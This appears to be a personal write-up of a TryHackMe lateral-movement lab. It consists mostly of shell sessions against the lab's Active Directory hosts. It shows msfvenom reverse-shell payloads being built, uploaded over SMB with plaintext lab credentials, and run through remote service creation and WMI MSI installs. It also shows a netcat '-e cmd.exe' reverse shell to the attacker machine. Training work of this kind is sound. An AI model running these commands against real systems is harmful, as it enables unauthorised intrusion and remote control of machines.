# Room Information

# Room Tasks

## Spawning Processes Remotely

```Bash
root@ip-10-10-43-174:~# systemd-resolve --interface lateralmovement --set-dns 10.200.122.101 --set-domain za.tryhackme.com
```
```Bash
root@ip-10-10-43-174:~# nslookup thmdc.za.tryhackme.com
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	thmdc.za.tryhackme.com
Address: 10.200.122.101
```

```Bash
root@ip-10-10-43-174:~# firefox "http://distributor.za.tryhackme.com/creds"
```

![]()

![]()

```Bash
root@ip-10-10-43-174:~# msfvenom -p windows/shell/reverse_tcp exe-service LHOST=10.50.49.249 LPORT=9999 -o NotMaliciousPayload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Saved as: NotMaliciousPayload.exe
```

```Bash
root@ip-10-10-43-174:~# smbclient -c 'put NotMaliciousPayload.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
WARNING: The "syslog" option is deprecated
putting file Payload.exe as \NotMaliciousPayload.exe (115.2 kb/s) (average 115.2 kb/s)
```

```Bash
root@ip-10-10-74-200:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

or

```Bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 9999;exploit"
```

```Bash
root@ip-10-10-43-174:~# ssh jenna.field@THMJMP2
jenna.field@thmjmp2's password: 

Microsoft Windows [Version 10.0.14393]                                       
(c) 2016 Microsoft Corporation. All rights reserved.                         

za\jenna.field@THMJMP2 C:\Users\jenna.field>
```

```Bash
root@ip-10-10-43-174:~# nc -lvnp 9998
Listening on [0.0.0.0] (family 0, port 9998)
```


```shell-session
za\jenna.field@THMJMP2 C:\Users\jenna.field>runas /netonly /user:ZA.TRYHACKME
.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.49.249 9998"     
Enter the password for ZA.TRYHACKME.COM\t1_leonard.summers:                  
Attempting to start c:\tools\nc64.exe -e cmd.exe 10.10.43.174 9998 as user "Z
A.TRYHACKME.COM\t1_leonard.summers" ...
```

```Bash
Listening on [0.0.0.0] (family 0, port 9998)
Connection from 10.200.122.249 58175 received!
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

```shell-session
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com create THMservice-NotMaliciousPayload binPath= "%windir%\NotMaliciousPayload.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com create THMservice-Payload binPath= "%windir%\NotMaliciousPayload.exe" start= auto
[SC] CreateService SUCCESS
```

```shell-session
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com start THMservice-Payload
sc.exe \\thmiis.za.tryhackme.com start THMservice-9999

SERVICE_NAME: THMservice-9999 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4596
        FLAGS              : 

```

TO COMPLETE

Username: jenna.field Password: Income1982

## Moving Laterally Using WMI

```Bash
root@ip-10-10-74-200:~# systemd-resolve --interface lateralmovement --set-dns 10.200.51.101 --set-domain za.tryhackme.com
```
```Bash
root@ip-10-10-74-200:~# nslookup thmdc.za.tryhackme.com
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	thmdc.za.tryhackme.com
Address: 10.200.51.101
```

```Bash
root@ip-10-10-74-200:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=9999 -f msi > myinstaller.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
```

```Bash
root@ip-10-10-74-200:~# smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
WARNING: The "syslog" option is deprecated
putting file myinstaller.msi as \myinstaller.msi (1879.5 kb/s) (average 1879.5 kb/s)
```

```Bash
root@ip-10-10-74-200:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

```Bash
root@ip-10-10-74-200:~# ssh t1_corine.waters@thmjmp2
t1_corine.waters@thmjmp2's password: 

Microsoft Windows [Version 10.0.14393]                                       
(c) 2016 Microsoft Corporation. All rights reserved.                         

za\t1_corine.waters@THMJMP2 C:\Users\t1_corine.waters> 
```

```shell-session
za\t1_corine.waters@THMJMP2 C:\Users\t1_corine.waters>powershell.exe                   
Windows PowerShell                                                           
Copyright (C) 2016 Microsoft Corporation. All rights reserved.               

PS C:\Users\t1_corine.waters>                                                     
```

```PowerShell
PS C:\Users\t1_corine.waters>  $username = 't1_corine.waters';                     
PS C:\Users\t1_corine.waters>  $password = 'Korine.1994';                          
PS C:\Users\t1_corine.waters>  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;                                                          
PS C:\Users\t1_corine.waters>  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;                        
PS C:\Users\t1_corine.waters>  $Opt = New-CimSessionOption -Protocol DCOM          
PS C:\Users\t1_corine.waters>  $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop    
```

```PowerShell
PS C:\Users\t1_corine.waters>  Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}                              

ReturnValue PSComputerName                                                   
----------- --------------                                                   
       1603 thmiis.za.tryhackme.com

```

``Bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.200.51.201 55639 received!
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```shell-session
C:\Windows\system32>C:\Users\t1_corine.waters\Desktop\flag.exe
C:\Users\t1_corine.waters\Desktop\flag.exe
THM{MOVING_WITH_WMI_4_FUN}
```

## Use of Alternate Authentication Material

## Abusing User Behavior

## Port Forwarding
